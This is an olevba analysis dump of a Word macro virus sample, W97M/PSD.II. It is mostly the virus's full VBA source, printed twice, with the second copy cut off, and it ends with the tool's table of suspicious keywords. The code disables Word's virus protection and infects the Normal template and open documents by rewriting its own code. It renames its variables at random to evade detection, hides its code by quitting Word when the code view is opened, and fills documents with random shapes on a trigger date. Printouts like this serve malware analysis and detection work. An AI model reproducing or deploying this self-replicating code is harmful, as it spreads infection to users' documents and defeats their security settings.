olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-f4f4b3ffab75d035bd65705966e33d2715f3637a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-f4f4b3ffab75d035bd65705966e33d2715f3637a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For BM7270 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next BM7270: End If
SL5777 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
OK8473 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set RC3468 = ActiveDocument.VBProject.VBComponents.Item(1)
QM680 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set RC3468 = NormalTemplate.VBProject.VBComponents.Item(1)
BM1845 = True
Call NQ8821_RB7083
ActiveDocument.Saved = True
End If
If BM1845 <> True And QM680 <> True Then GoTo CR658
If BM1845 = True Then RC3468.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SL5777 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If QM680 = True Then RC3468.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OK8473 - 4))
CR658:
If OK8473 <> 0 And SL5777 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function NQ8821_RB7083()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "HJ6677": r1(2) = "MO1121": r1(3) = "EG91": r1(4) = "RQ3090": r1(5) = "RB7083": r1(6) = "SL5777"
r1(7) = "OK8473": r1(8) = "QM680":: r1(9) = "RC3468": r1(10) = "BM1845": r1(11) = "CR658": r1(12) = "NQ8821": r1(13) = "RF3982": r1(14) = "QJ345": r1(15) = "BM7270"
For BM7270 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call RB7083(a1, r1(BM7270))
Next BM7270
End Function 'VAMP v1.0 [thanks Vic!]
Private Function RB7083(QJ345, RF3982 As String)
On Error Resume Next
Dim HJ6677 As Long: Dim MO1121 As Long: Dim EG91 As Long: Dim RQ3090 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
HJ6677 = 1: MO1121 = 1: EG91 = .CountOfLines: RQ3090 = Len(.Lines(.CountOfLines, 1))
Do While .Find(RF3982, HJ6677, MO1121, EG91, RQ3090, True)
strline = .Lines(HJ6677, 1)
strline = Left(strline, MO1121 - 1) & QJ345 & Mid(strline, RQ3090)
.replaceline HJ6677, strline
HJ6677 = EG91 + 1: MO1121 = 1:
EG91 = .CountOfLines
RQ3090 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Private Sub Document_C()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For LP6860 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next LP6860: End If
KQ8133 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CM9031 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = ActiveDocument.VBProject.VBComponents.Item(1)
OT7120 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = NormalTemplate.VBProject.VBComponents.Item(1)
BN320 = True
Call KD5741_KM6385
ActiveDocument.Saved = True
End If
If BN320 <> True And OT7120 <> True Then GoTo VN151
If BN320 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KQ8133 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If OT7120 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CM9031 - 4))
VN151:
If CM9031 <> 0 And KQ8133 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function KD5741_KM6385()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "FD8988": r1(2) = "UP8720": r1(3) = "IG4087": r1(4) = "TL7973": r1(5) = "KM6385": r1(6) = "KQ8133"
r1(7) = "CM9031": r1(8) = "OT7120":: r1(9) = "HV823": r1(10) = "BN320": r1(11) = "VN151": r1(12) = "KD5741": r1(13) = "HD853": r1(14) = "FS9162": r1(15) = "LP6860"
For LP6860 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KM6385(a1, r1(LP6860))
Next LP6860
End Function 'VAMP v1.0 [thanks Vic!]
Private Function KM6385(FS9162, HD853 As String)
On Error Resume Next
Dim FD8988 As Long: Dim UP8720 As Long: Dim IG4087 As Long: Dim TL7973 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
FD8988 = 1: UP8720 = 1: IG4087 = .CountOfLines: TL7973 = Len(.Lines(.CountOfLines, 1))
Do While .Find(HD853, FD8988, UP8720, IG4087, TL7973, True)
strline = .Lines(FD8988, 1)
strline = Left(strline, UP8720 - 1) & FS9162 & Mid(strline, TL7973)
.replaceline FD8988, strline
FD8988 = IG4087 + 1: UP8720 = 1:
IG4087 = .CountOfLines
TL7973 = Len(.Lines(.CountOfLines, 1))
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

